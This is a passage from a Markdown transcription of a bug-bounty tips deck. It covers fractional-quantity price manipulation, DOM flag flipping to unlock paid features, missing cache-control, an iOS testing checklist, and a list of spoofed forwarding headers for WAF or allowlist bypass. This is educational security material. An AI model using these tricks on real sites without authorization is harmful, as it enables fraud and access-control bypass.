items[][quantity]= 1    --> 39.4 €
items[][quantity]= 0.1  --> 3.9 €
```

Congratulations, you bought the order for 1/10 of the price.

**Why it matters:** Quantity validation that only checks an upper bound accepts fractions, and the total drops below the intended unit price.

---

### 93. Application Logic Bugs Are Important

**Source:** @CircleNinja · **Slide:** 36/116

```
Application Logic Bugs: IMPORTANT

You don't always need Burpsuite or proxy.

Inspecting a page can rain bounties.
```

1. Application allows for free and paid feature.
2. Only able to access free feature.
3. Clicking paid feature, redirects to payment link for paid.
4. Went back, checked the page via "Inspect element".
5. Found a param as 'disabled'.
6. Changed to 'enabled'.
7. Access granted to paid feature.

**Why it matters:** Feature gating implemented only in the DOM is not access control — the client can always flip the flag.

---

## Caching & Smuggling

<details>
<summary>Show tips in this section</summary>

- [94. Missing Cache-Control on Authenticated Pages](#94-missing-cache-control-on-authenticated-pages)
- [95. WAF-Bypassing Forwarding Headers](#95-waf-bypassing-forwarding-headers)

</details>

### 94. Missing Cache-Control on Authenticated Pages

**Slide:** 55/116

```
Bug type - Sever Security Misconfiguration -> Lack of security headers -> Cache control for a security page.
```

Steps to reproduce:

1. Log in to the application.
2. Navigate around the pages.
3. Log out.
4. Press `Alt + left-arrow`.
5. If you are logged in or can view the pages navigated by the user, then give yourself a pat.

You just found a bug.

**Why it matters:** Without `Cache-Control: no-store`, the browser's back button can render private pages after logout on a shared machine.

---

### 95. WAF-Bypassing Forwarding Headers

**Source:** @offensivekrish (hackergenix.com) · **Slide:** 66/116

It might bypass the WAF and forward your request:

```http
X-Forwarded-For: client1, proxy1, proxy2
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Cluster-Client-IP: 127.0.0.1
Fastly-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Proto: 127.0.0.1
X-Forwarded-By: 127.0.0.1
```

**Why it matters:** Apps and WAFs disagree about which hop is the real client; a spoofed loopback address can land you in an allowlisted trust zone.

---

## Mobile

<details>
<summary>Show tips in this section</summary>

- [96. iOS Vulnerability Assessment (Mind Map)](#96-ios-vulnerability-assessment-mind-map)
- [97. iOS Pentesting (Mind Map)](#97-ios-pentesting-mind-map)

</details>

### 96. iOS Vulnerability Assessment (Mind Map)

**Source:** @hackerscrolls · **Tags:** #iOS #Security · **Slide:** 9/116

- **Network API**
  - Check all web bugs; is it possible to bypass using public scripts?
  - Does the app use SSL/TLS correctly?
  - Does the app have SSL pinning?
  - Is App Transport Security configured correctly?
- **Broken Cryptography**
  - Check for hardcoded encryption keys and IVs
  - How are encryption keys managed?
  - Does the app use weak ciphers or weak random?
  - Does the app reuse encryption keys?
- **Insecure Data Storage**
  - Device/App logs, plist files, CoreData
  - `NSUserDefaults`, volatile memory, SQLite/Cache/Firebase/Realm
  - Check if the app stores sensitive data unencrypted
  - Check if the UI pasteboard is used
  - Check for sensitive data in backups
  - Is sensitive data masked in text fields?
  - Are screenshots allowed on sensitive screens?
  - Is sensitive data removed from the snapshot when the app is minimized?
  - Is the keyboard cache disabled for sensitive data?
  - Does the app clear memory after submitting sensitive data?
- **Authentication**
  - Check for session-management bugs
  - Does the app establish a session?
  - Is validation done on the client side?
  - Check if the keychain is wiped after log out or app uninstall
  - Does the app require auth on high-risk operations?
  - Is Touch ID/Face ID working correctly?
  - Does the app have a PIN?
  - Check notifications don't disclose sensitive data
  - Hook to bypass
- **Runtime / Dynamic Analysis**
  - Using Hopper
  - Method swizzling & categories
  - Callback & blocks
  - **Client-side attack:** SQL injection, cross-site scripting, prediction injection, XML injection, application-level DoS
  - **Broken authentication & session management:** session terminating after password reset, expired token can be reused, authentication bypass using success response, OAuth flow & 2FA bypass, cleartext transmission
  - **Broken access control (BAC):** SSRF, privilege escalation & IDOR, unauthorized API call
- **Web-Based Exploitation**
  - Abuse `UIWebView`
  - Risk of JavaScript Cocoa bridge
  - **iOS networking:** iOS URL loading system, `NSURLSession`, proxy configure/SSL pinning
- **Interprocess Communication**
  - **Scheme:** custom scheme, universal link
  - Sharing data with `UIActivity`
  - **Application extension:** exploit of pasteboard, restricting and validating shareable data
- **Reverse Engineering / Debugging**
  - Unauthorized code modification
  - Insecure version of OS installation allowed
- **Insecure Data Storage (static)**
  - iOS directory structure
  - In SQLite database
  - In `Info.plist`
  - Core framework
  - Keychain
- **Custom URL Schemes**
  - Check if the app handles deeplinks or universal links (`app://` or `https://app.com`) → analyze and fuzz it
  - If the link performs an action, check for CSRF
  - Hidden functionality
  - Is scheme hijacking possible? → auth bypass
- **Web Views**
  - Is JS disabled in `WebView`? → XSS
  - Is file access used? → path traversal
  - Client-side web bugs
  - Check if other URL schemes are enabled (`tel:`, `sms:`)
  - Check if the URI in `WebView` can be manipulated by the user
  - Do native methods exposed over the `WebView`?
- **Client Side Protections & Hardening**
  - Is jailbreak detection present? → hook functions
  - Is hooking detection in place?
  - Update required if a newer version of the app is available?
  - Does the app use the minimum set of permissions?
  - Is tampering possible? → patch functions and resign IPA
  - Is it possible to attach LLDB?
  - Obfuscation: are sensitive methods obfuscated? Is control-flow-graph obfuscation implemented?
  - Are debug code or symbols stripped?
  - Are exceptions handled correctly? → possible DoS/RCE
  - Are binary protections used? ARC / stack canary / PIE
  - Does the app use native libs? → check for memory-corruption bugs
- **Third-Party Libraries**
  - Check dependencies for known vulnerabilities
  - Read the documentation to understand possible misconfigurations
  - Does the app allow the usage of third-party keyboards for sensitive data?
  - Is sensitive data masked and anonymized if sent to third parties?
- **iOS Security Model & Legacy Issues**
  - Jailbreak detection & sandboxing, SSL unpinning, disabling certificate validation, ASLR/PIE flag check, format strings, buffer overflows & stack, integer overflow & heap
- **Weak Cryptography**
  - Data protection API, weak hashing & encryption, poor key-management process, use of custom encryption protocols
- **Unintended Data Leakage**
  - `NSLog` / Apple system log, application backgrounding/snapshots, cache prediction, pasteboard, pastebin, GitHub, keylogging & auto-correction database, state preservation

**Why it matters:** The map turns an iOS assessment into concrete questions per area — storage, transport, IPC, WebViews, and binary hardening.

---

### 97. iOS Pentesting (Mind Map)

**Source:** @hackerscrolls · **Tags:** #iOS #Pentesting · **Slide:** 11/116

- **Runtime / Dynamic Analysis**
  - Using Hopper, method swizzling & categories, callback & blocks
  - **Client-side attack:** SQL injection, cross-site scripting, prediction injection, XML injection, application-level DoS
  - **Broken authentication & session management:** session terminating after password reset, expired token can be reused, authentication bypass using success response, OAuth flow & 2FA bypass, cleartext transmission
  - **Broken access control (BAC):** SSRF, prev escalation & IDOR, unauthorized API call
- **Web-Based Exploitation** — abuse `UIWebView`, risk of JavaScript Cocoa bridge
- **iOS Networking** — iOS URL loading system, `NSURLSession`, proxy configure / SSL pinning
- **Interprocess Communication** — scheme (custom scheme, universal link), sharing data with `UIActivity`, application extension (exploit of pasteboard, restricting and validating shareable data)
- **Reverse Engineering / Debugging** — unauthorized code modification, insecure version of OS installation allowed
- **Insecure Data Storage** — iOS directory structure, in SQLite database, in `Info.plist`, core framework, keychain
- **Lab Setup**
  - Jailbroken device
  - 1. MTerminal, 2. Substrate Safe Mode, 3. OpenSSH, 4. IPA Installer, 5. BigBoss recommended tools, 6. Network commands, 7. Bootstrap commands, 8. Developer `cmds`, 9. Filza, 10. Make, 11. Nano, 12. Apple Find Conduct Tool, 13. House Arrest Fix, 14. PreferencesLoader
  - Cydia, class dump, `Frida-iOS-dump`
- **Application Installation** — using IPA file, using `app` file, decrypting app
- **iOS Security Model & Legacy Issue** — jailbreak detection & sandboxing, SSL unpinning, disabling certificate validation, ASLR/PIE flag check, format strings, buffer overflows & stack, integer overflow & heap
- **Weak Cryptography** — data protection API, weak hashing & encryption, poor key-management process, use of custom encryption protocols
- **Unintended Data Leakage** — `NSLog` / Apple system log, application backgrounding / snapshots, cache prediction, pasteboard, pastebin, GitHub, keylogging & auto-correction database, state preservation

**Why it matters:** A one-glance syllabus for iOS testing, from lab setup through dynamic analysis and data-leakage checks.

---

## Appendix — Duplicate slides

The deck repeats several slides. They are listed here for completeness instead of inflating the main reference.

| Slide | Title | Same as |
|------:|-------|---------|
| 26 | SSRF Search & Destroy | [#73 SSRF Search & Destroy (Mind Map)](#73-ssrf-search--destroy-mind-map) |
| 32 | CORS Protection RegEx Bypass | [#85 CORS Protection RegEx Bypass](#85-cors-protection-regex-bypass) |
| 39 | xmlrpc.php Pingback | [#75 Vulnerabilities Emerging with `xmlrpc.php` Pingback Module](#75-vulnerabilities-emerging-with-xmlrpcphp-pingback-module) |
| 42 | File Upload Leads to SVG XSS | [#79 File Upload Leads to SVG XSS](#79-file-upload-leads-to-svg-xss) |
| 63 | 2FA Bypass by Toggling `mfa` | [#40 2FA Bypass by Toggling `mfa` in the Login Response](#40-2fa-bypass-by-toggling-mfa-in-the-login-response) |
| 72 | Bypassing Most File Upload Filters | [#80 Bypassing Most File Upload Filters](#80-bypassing-most-file-upload-filters) |
| 83 | Top 15 DOM-Based Open URL Parameters | [#90 Top 15 DOM-Based Open URL Parameters](#90-top-15-dom-based-open-url-parameters) |
| 95 | Endpoint Bypass Methodology | [#51 Endpoint Bypass Methodology](#51-endpoint-bypass-methodology) |
| 96 | Header-Based Endpoint Bypass | [#52 Header-Based Endpoint Bypass](#52-header-based-endpoint-bypass) |
| 97 | Header-Based Endpoint Bypass | [#52 Header-Based Endpoint Bypass](#52-header-based-endpoint-bypass) |
| 100 | Tips for "Forgotten Password" Functionality | [#43 Tips for "Forgotten Password" Functionality](#43-tips-for-forgotten-password-functionality) |
| 103 | Token-Based Authentication | [#45 Token-Based Authentication](#45-token-based-authentication) |
| 105 | API Endpoint Bypass Cheatsheet | [#54 API Endpoint Bypass Cheatsheet (Ansar Uddin)](#54-api-endpoint-bypass-cheatsheet-ansar-uddin) |
| 106 | Endpoint Bypass Methodology | [#51 Endpoint Bypass Methodology](#51-endpoint-bypass-methodology) |
| 110 | Auth Strategies — Basic Authentication | [#44 Auth Strategies — Basic Authentication](#44-auth-strategies--basic-authentication) |
| 111 | JWT — JSON Web Tokens | [#47 JWT — JSON Web Tokens](#47-jwt--json-web-tokens) |
| 113 | Primer on Character Encodings | [#8 Primer on Character Encodings](#8-primer-on-character-encodings) |
| 115 | OAuth — Open Authorization | [#48 OAuth — Open Authorization](#48-oauth--open-authorization) |
| 116 | Auth Strategies — Session-Based Authentication | [#46 Auth Strategies — Session-Based Authentication](#46-auth-strategies--session-based-authentication) |

---

*Transcribed from the original `bounty_tips_100+.pdf` deck. Slides are credited to their authors where shown; the transcription adds section grouping, short context notes, and duplicate merging.*